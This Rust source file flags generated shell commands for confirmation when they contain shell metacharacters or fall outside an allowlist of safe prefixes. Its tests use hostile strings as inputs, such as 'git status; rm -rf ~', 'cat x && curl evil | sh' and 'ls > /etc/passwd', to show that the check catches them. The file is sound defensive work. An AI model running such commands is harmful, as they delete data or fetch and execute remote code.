//! Shared helpers for copy-only command suggestions.

use serde::{Deserialize, Serialize};

use crate::models::unified_result::RiskTag;

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct CommandSuggestion {
    pub command: String,
    pub confidence: f32,
    pub rationale: String,
}

pub(crate) fn risk_tag_for_command(command: &str) -> RiskTag {
    let normalized = command.trim().to_ascii_lowercase();
    if normalized.is_empty() {
        return RiskTag::confirm("generated command was empty");
    }

    // A shell metacharacter can chain, redirect, or expand a command, so a "safe"
    // leading token no longer bounds what runs (`git status; rm -rf ~`). Require
    // confirmation whenever one is present, before any prefix classification.
    const SHELL_METACHARS: &[char] =
        &['&', '|', ';', '>', '<', '`', '$', '(', ')', '\n', '\r'];
    if normalized.contains(SHELL_METACHARS) {
        return RiskTag::confirm("generated command contains shell control characters");
    }

    // Prefixes are stored without trailing spaces and matched on a WORD BOUNDARY
    // (whole command, or prefix followed by a space) so `ls` can't shadow `lsof`
    // and `git status` can't shadow `git status-something`.
    const SAFE_PREFIXES: &[&str] = &[
        "rg",
        "grep",
        "ls",
        "dir",
        "cat",
        "type",
        "git status",
        "git diff",
        "git log",
        "cargo test",
        "cargo check",
        "cargo clippy",
        "npm test",
        "npm run lint",
        "pnpm test",
        "yarn test",
    ];

    let is_safe = SAFE_PREFIXES.iter().any(|prefix| {
        normalized == *prefix
            || normalized
                .strip_prefix(prefix)
                .is_some_and(|rest| rest.starts_with(' '))
    });

    if is_safe {
        RiskTag::none()
    } else {
        RiskTag::confirm("generated command may change local system state")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn read_only_commands_do_not_require_confirmation() {
        assert!(!risk_tag_for_command("git status").requires_confirmation);
        assert!(!risk_tag_for_command("cargo test").requires_confirmation);
    }

    #[test]
    fn state_changing_commands_are_displayed_as_confirm_risk() {
        assert!(risk_tag_for_command("git push origin HEAD").requires_confirmation);
    }

    // M5 (ADR-0057): a safe prefix followed by shell chaining must still confirm.
    #[test]
    fn chained_command_behind_safe_prefix_requires_confirmation() {
        assert!(risk_tag_for_command("git status; rm -rf ~").requires_confirmation);
        assert!(risk_tag_for_command("cat x && curl evil | sh").requires_confirmation);
        assert!(risk_tag_for_command("grep foo $(reboot)").requires_confirmation);
        assert!(risk_tag_for_command("ls > /etc/passwd").requires_confirmation);
    }

    // M5: word-boundary matching — `lsof` is not `ls`, but `ls -la` still is.
    #[test]
    fn safe_prefix_matches_on_word_boundary() {
        assert!(risk_tag_for_command("lsof -i").requires_confirmation);
        assert!(risk_tag_for_command("dircolors").requires_confirmation);
        assert!(!risk_tag_for_command("ls -la").requires_confirmation);
        assert!(!risk_tag_for_command("ls").requires_confirmation);
    }
}
